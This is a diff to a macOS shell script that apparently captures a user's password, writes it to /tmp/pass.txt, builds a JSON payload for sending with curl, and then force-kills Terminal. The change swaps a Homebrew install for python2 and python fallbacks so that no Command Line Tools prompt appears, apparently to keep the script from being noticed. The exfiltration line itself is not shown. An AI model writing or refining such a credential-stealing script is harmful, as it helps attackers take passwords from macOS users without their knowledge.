@@ -11,7 +11,8 @@
 # - Finally, it force-kills Terminal.
 #
 # Requirements:
-#   - macOS with osascript, curl, and either python3 or python installed.
+#   - macOS with osascript, curl, and either python3 (with developer tools installed) 
+#     or python2/python available.
 #
 # Usage:
 #   chmod +x combined_script.sh
@@ -118,23 +119,17 @@ else
     # --- Save Data to Temporary File ---
     echo -e "$capture" > /tmp/pass.txt
     
-    # --- Determine Python Interpreter (Prefer python3; auto-install if missing) ---
-    if command -v python3 &>/dev/null; then
+    # --- Determine Python Interpreter Avoiding CLT Prompt ---
+    # Prefer python3 if the developer tools are installed.
+    if command -v python3 &>/dev/null && xcode-select -p &>/dev/null; then
         PYTHON=python3
+    elif command -v python2 &>/dev/null; then
+        PYTHON=python2
+    elif command -v python &>/dev/null; then
+        PYTHON=python
     else
-        if command -v brew &>/dev/null; then
-            echo "python3 not found. Installing python3 via Homebrew..."
-            brew install python3
-            if command -v python3 &>/dev/null; then
-                PYTHON=python3
-            else
-                echo "Failed to install python3. Falling back to python."
-                PYTHON=python
-            fi
-        else
-            echo "Homebrew not found. Falling back to python."
-            PYTHON=python
-        fi
+        echo "No suitable Python interpreter found."
+        exit 1
     fi
     
     # --- Generate JSON Payload ---
